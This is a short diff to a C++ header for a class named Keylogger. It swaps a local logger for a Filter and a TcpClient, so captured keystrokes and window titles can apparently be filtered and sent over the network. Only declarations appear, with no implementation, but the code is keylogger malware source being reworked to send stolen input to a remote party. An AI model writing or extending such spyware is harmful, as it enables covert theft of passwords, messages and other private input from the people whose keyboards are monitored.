@@ -1,6 +1,7 @@
 #pragma once
-#include <windows.h>
-#include "../Logger/Logger.h"
+
+#include "Filtering.h"
+#include "Networking.h"
 #include <string>
 #include <vector>
 
@@ -15,13 +16,15 @@ private:
 
 	static const std::vector<std::wstring> specialKeysNames;
 
-	Logger* logger;
+	Filter* filter;
+	TcpClient* client;
+
 	HWND hLastTrackedWindow = NULL;
 	bool titleUpdateRequest = false;
 	std::wstring windowTitle;
 
 public:
-	Keylogger(Logger* logger);
+	Keylogger(TcpClient* client, Filter* filter);
 	~Keylogger();
 
 	void logKeys();
